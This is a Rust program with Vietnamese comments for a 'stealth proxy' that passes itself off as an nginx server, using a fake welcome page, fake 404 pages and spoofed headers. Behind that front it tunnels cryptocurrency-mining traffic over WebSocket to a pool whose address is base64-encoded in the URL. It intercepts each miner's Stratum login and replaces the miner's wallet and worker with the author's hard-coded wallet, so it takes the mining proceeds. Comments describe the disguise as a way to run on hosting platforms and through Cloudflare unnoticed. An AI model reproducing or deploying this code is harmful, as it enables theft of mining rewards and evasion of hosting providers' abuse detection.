use axum::{
    extract::{Path, WebSocketUpgrade, ws::{Message, WebSocket}, Request},
    response::{Html, Response, IntoResponse},
    http::{StatusCode, HeaderValue, header::{SERVER, DATE, CONNECTION, CONTENT_TYPE}},
    routing::get,
    Router,
    middleware::{self, Next},
};
use std::{sync::{Arc, atomic::{AtomicUsize, Ordering}}, net::SocketAddr};
use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use futures_util::{StreamExt, SinkExt};
use serde_json::Value;
use base64::{Engine as _, engine::general_purpose};
use colored::*;
use chrono::Utc;

// ==========================================
// ⚙️ CẤU HÌNH VÍ & WORKER CỦA BẠN
// ==========================================
const LISTEN_ADDR: &str = "0.0.0.0:8080"; // Port 8080 để chạy tốt trên Koyeb/Docker
const MY_WALLET: &str = "SC11rezQ11DLX63oNaZD3Z5ggonmtfyehVhyjb1bFeLMB7emmGhDodc268uvcT87HTYsqqi4mzkZmQB4xgNeBRCf84CCygp9vQ.PY";
const MY_WORKER: &str = "Worker_Rust_God";

// ==========================================
// 🎭 TRANG WEB GIẢ MẠO (NGINX FAKE)
// ==========================================
const NGINX_WELCOME: &str = r#"<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
    body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and working. Further configuration is required.</p>
<p><em>Thank you for using nginx.</em></p>
</body>
</html>"#;

const NGINX_404: &str = r#"<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx</center>
</body>
</html>"#;

// ==========================================
// APP START
// ==========================================
struct ProxyStats {
    shares_sent: AtomicUsize,
    shares_accepted: AtomicUsize,
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt().with_max_level(tracing::Level::WARN).init();

    // Router xử lý:
    // / -> Trang chủ Nginx giả
    // /:path -> Kiểm tra xem có phải link Mining không
    let app = Router::new()
        .route("/", get(root_handler))
        .route("/:path", get(stealth_handler))
        .layer(middleware::from_fn(nginx_header_spoofer));

    let addr: SocketAddr = LISTEN_ADDR.parse().expect("Invalid IP");
    println!("{} {}", "💀 STEALTH PROXY RUNNING ON".green().bold(), addr);
    println!("💰 Target: {}", MY_WALLET.yellow());

    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
    axum::serve(listener, app).await.unwrap();
}

// ==========================================
// 🛡️ MIDDLEWARE: GIẢ MẠO HEADER HTTP
// ==========================================
async fn nginx_header_spoofer(req: Request, next: Next) -> Response {
    let mut response = next.run(req).await;
    let headers = response.headers_mut();

    // 1. Giả danh Server Nginx Ubuntu
    headers.insert(SERVER, HeaderValue::from_static("nginx/1.18.0 (Ubuntu)"));
    
    // 2. Thêm ngày giờ chuẩn Server
    let now = Utc::now().format("%a, %d %b %Y %H:%M:%S GMT").to_string();
    if let Ok(val) = HeaderValue::from_str(&now) {
        headers.insert(DATE, val);
    }

    // 3. Chỉ thêm Keep-Alive nếu không phải là WebSocket Upgrade
    if response.status() != StatusCode::SWITCHING_PROTOCOLS {
        headers.insert(CONNECTION, HeaderValue::from_static("keep-alive"));
    }

    response
}

// ==========================================
// HANDLERS
// ==========================================
async fn root_handler() -> Html<&'static str> {
    Html(NGINX_WELCOME)
}

async fn stealth_handler(Path(path): Path<String>, ws: Option<WebSocketUpgrade>) -> Response {
    // 1. Giải mã Base64 (Hỗ trợ cả URL Safe và Standard để Cloudflare không bị lỗi)
    let decoded_vec = if let Ok(d) = general_purpose::STANDARD.decode(&path) { d }
    else if let Ok(d) = general_purpose::URL_SAFE_NO_PAD.decode(&path) { d }
    else { return not_found_response() };

    let pool_addr = match String::from_utf8(decoded_vec) {
        Ok(s) => if s.contains(':') { s } else { return not_found_response() },
        Err(_) => return not_found_response(),
    };

    // 2. Chỉ chấp nhận WebSocket -> Kích hoạt Mining Tunnel
    match ws {
        Some(w) => {
            println!("{} Tunnel -> {}", "🥷".magenta(), pool_addr);
            w.on_upgrade(move |socket| mining_tunnel(socket, pool_addr))
        },
        None => not_found_response() // Nếu là trình duyệt thường -> Trả về 404 Nginx
    }
}

fn not_found_response() -> Response {
    (StatusCode::NOT_FOUND, [(CONTENT_TYPE, "text/html")], Html(NGINX_404)).into_response()
}

// ==========================================
// ⛏️ MINING CORE (LOGIC CŨ CỦA BẠN ĐÃ TỐI ƯU)
// ==========================================
async fn mining_tunnel(socket: WebSocket, pool_addr: String) {
    // Kết nối TCP đến Pool thật
    let tcp_stream = match TcpStream::connect(&pool_addr).await {
        Ok(s) => s,
        Err(e) => {
            println!("{} Pool Connect Fail: {}", "❌".red(), e);
            return;
        }
    };

    let (mut pool_read, mut pool_write) = tcp_stream.into_split();
    let (mut ws_write, mut ws_read) = socket.split();
    
    let stats = Arc::new(ProxyStats {
        shares_sent: AtomicUsize::new(0),
        shares_accepted: AtomicUsize::new(0),
    });

    // LUỒNG 1: Miner -> Pool (Thay ví)
    let stats_miner = stats.clone();
    let client_to_server = tokio::spawn(async move {
        while let Some(Ok(msg)) = ws_read.next().await {
            match msg {
                Message::Text(text) => {
                    for line in text.lines() {
                        if line.trim().is_empty() { continue; }
                        let mut final_msg = line.to_string();
                        
                        // Parse JSON để thay ví
                        if line.contains("login") || line.contains("submit") {
                            if let Ok(mut json) = serde_json::from_str::<Value>(line) {
                                if let Some(method) = json["method"].as_str() {
                                    if method == "login" {
                                        if let Some(params) = json.get_mut("params") {
                                            // 🕵️ INTERCEPT: Thay bằng ví của bạn
                                            params["login"] = serde_json::json!(MY_WALLET);
                                            params["pass"] = serde_json::json!(MY_WORKER);
                                            final_msg = json.to_string();
                                            println!("{} Intercepted Login -> Swapped Wallet", "🕵️".yellow());
                                        }
                                    } else if method == "submit" {
                                        stats_miner.shares_sent.fetch_add(1, Ordering::Relaxed);
                                    }
                                }
                            }
                        }
                        
                        if !final_msg.ends_with('\n') { final_msg.push('\n'); }
                        if pool_write.write_all(final_msg.as_bytes()).await.is_err() { return; }
                    }
                }
                Message::Close(_) => break,
                _ => {}
            }
        }
    });

    // LUỒNG 2: Pool -> Miner (Audit Share)
    let stats_pool = stats.clone();
    let server_to_client = tokio::spawn(async move {
        let mut buffer = [0u8; 8192];
        loop {
            match pool_read.read(&mut buffer).await {
                Ok(0) => break,
                Ok(n) => {
                    let data = &buffer[0..n];
                    if let Ok(text) = std::str::from_utf8(data) {
                         // Gửi Text frame về cho Miner
                         if ws_write.send(Message::Text(text.to_string())).await.is_err() { break; }
                         
                         // Audit: Kiểm tra xem Pool có chấp nhận Share không
                         if text.contains("\"status\":\"OK\"") || text.contains("\"result\":true") {
                             let total = stats_pool.shares_accepted.fetch_add(1, Ordering::Relaxed) + 1;
                             let sent = stats_pool.shares_sent.load(Ordering::Relaxed);
                             println!("{} Share Accepted ({}/{})", "✅".green(), total, sent);
                         }
                    }
                }
                Err(_) => break,
            }
        }
    });

    let _ = tokio::select! { _ = client_to_server => {}, _ = server_to_client => {} };
}
